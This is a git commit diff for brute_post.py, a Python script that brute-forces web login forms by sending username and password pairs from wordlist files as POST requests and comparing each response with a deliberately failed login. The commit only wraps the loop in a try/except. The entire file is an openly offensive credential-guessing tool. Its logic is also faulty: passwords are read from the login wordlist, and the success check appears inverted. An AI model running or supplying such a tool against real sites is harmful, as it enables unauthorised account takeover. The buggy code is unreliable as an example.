4a57b7c3ea1c93fbfe9227d408f9a66f1bd4dbd3
RagenIV <z3-1415926@yandex.ru>
2017-04-29 08:15:45 +0400

    Update brute_post.py

--- brute_post.py
+++ brute_post.py
@@ -3,49 +3,51 @@
 import requests
 
 def brute(url, loginfield, pwdfield, Size=0):
-	url = str(url)
-	pwdfield = str(pwdfield)
-	loginfield = str(loginfield)
-	
-	logins = []
-	f = open('brutebase_login_' + str(Size) + '.txt', 'r')
-	for line in f:
-		logins.append(line[:-1])
-	f.close()
-	
-	pwds = []
-	f = open('brutebase_login_' + str(Size) + '.txt', 'r')
-	for line in f:
-		pwds.append(line[:-1])
-	f.close()
-	
-	invalid = []
-	f = open('invalid_login.txt', 'r')
-	for line in f:
-		if len(line) > 2:
-			invalid.append(line[:-1])
-	
-	flag = 0 != 0
-	
-	r = requests.post(url, data={loginfield : '3toTo4noNeparol', pwdfield : '3toto4noNelogin'})
-	if r.status_code == 200:
-		bad_test = r.text
-		for log in logins:
-			if flag:
-				break
-			else:
-				for pas in pwds:
-					r = requests.post(url, data={loginfield : log, pwdfield : pas})
-					if r.status_code == 200:
-						test = r.text
-						for inva in invalid:
-							if test.find(inva) != -1:
-								flag = 0 == 0
-								break
-						if flag:
-							if bad_test != test:
-								return [log,pas]
-								break
-	
+	try:
+		url = str(url)
+		pwdfield = str(pwdfield)
+		loginfield = str(loginfield)
+		
+		logins = []
+		f = open('brutebase_login_' + str(Size) + '.txt', 'r')
+		for line in f:
+			logins.append(line[:-1])
+		f.close()
+		
+		pwds = []
+		f = open('brutebase_login_' + str(Size) + '.txt', 'r')
+		for line in f:
+			pwds.append(line[:-1])
+		f.close()
+		
+		invalid = []
+		f = open('invalid_login.txt', 'r')
+		for line in f:
+			if len(line) > 2:
+				invalid.append(line[:-1])
+		
+		flag = 0 != 0
+		
+		r = requests.post(url, data={loginfield : '3toTo4noNeparol', pwdfield : '3toto4noNelogin'})
+		if r.status_code == 200:
+			bad_test = r.text
+			for log in logins:
+				if flag:
+					break
+				else:
+					for pas in pwds:
+						r = requests.post(url, data={loginfield : log, pwdfield : pas})
+						if r.status_code == 200:
+							test = r.text
+							for inva in invalid:
+								if test.find(inva) != -1:
+									flag = 0 == 0
+									break
+							if flag:
+								if bad_test != test:
+									return [log,pas]
+									break
+	except:
+		flag = 0 != 0
 	if not(flag):
 		return ['None', 'None', 'None']
